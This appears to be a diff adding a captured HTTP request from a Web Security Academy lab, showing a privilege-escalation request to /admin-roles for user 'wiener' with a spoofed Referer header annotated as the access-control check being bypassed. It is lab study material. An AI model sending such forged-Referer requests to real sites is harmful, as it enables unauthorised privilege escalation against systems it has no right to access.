@@ -1,0 +1,11 @@
+GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
+Host: acdd1f311f5c658f800b476d004600d5.web-security-academy.net
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: https://acdd1f311f5c658f800b476d004600d5.web-security-academy.net/admin # <---------- Access control based on this
+Connection: close
+Cookie: session=2rDOqWgItvJuAS4A2HaJCgQqEZrXTys5
+Upgrade-Insecure-Requests: 1
+
